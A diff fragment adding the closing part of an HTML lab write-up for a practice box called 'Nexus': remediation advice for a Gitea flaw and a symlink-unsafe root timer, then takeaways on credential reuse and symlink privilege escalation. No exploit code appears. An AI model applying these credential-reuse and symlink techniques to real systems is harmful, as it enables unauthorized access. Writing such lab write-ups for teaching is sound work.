+        <td style="padding:11px 0; color:var(--text-3)">Update to Gitea &ge; 1.27.1. Restrict who can push to repositories on the instance; limit blast radius by running Gitea as a least-privilege user with no shell access to other accounts' data.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Symlink-unsafe file write as root</strong><br><span style="color:var(--text-4);font-size:13px">Systemd timer writing to a user-controlled path</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Any root-run process that writes to a path under a non-root-owned directory must validate that no symlinks are present in the path. Use <code>O_NOFOLLOW</code> or equivalent, or keep staging directories root-owned. Running the timer service as a dedicated non-root user would also contain the blast radius.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <!-- ==================== 12 ==================== -->
+  <h2><span class="num">12</span>Takeaways</h2>
+
+  <p>Nexus is a straightforward chain, but it earns the "easy" rating by keeping each step clear
+  rather than trivial. A few habits that made the difference here:</p>
+
+  <p><strong>Take notes on everything, not just the obvious stuff.</strong> The hiring manager's email
+  from a job posting became a Krayin login credential three steps later. The commit-history password
+  became an SSH password after that. Neither of those connections is obvious in the moment — they only
+  pay off because you wrote them down.</p>
+
+  <p><strong>Every credential found is a candidate for reuse everywhere else.</strong> This box uses
+  the same password across SSH, Gitea, and CRM login. That's contrived for a lab, but it's also
+  genuinely common in real environments. Credential spraying is boring; credential <em>noting</em>
+  and reusing strategically is the habit that actually works.</p>
+
+  <p><strong>When a process runs as root and writes to a path you control, that's an arbitrary write primitive.</strong>
+  The template-sync script wasn't broken code — it was doing exactly what it was designed to do.
+  The flaw was that root was writing into a directory tree that the <code>git</code> user could reshape.
+  Symlink attacks against root scripts are a pattern worth recognizing instantly: the moment you see
+  a root job writing to a user-writable path, think "symlink."</p>
+
+  <p><strong>Check both cron and systemd timers.</strong> Root jobs can be scheduled either way and it's
+  easy to miss one if you only check the other. Both are worth the two seconds they take to scan.</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
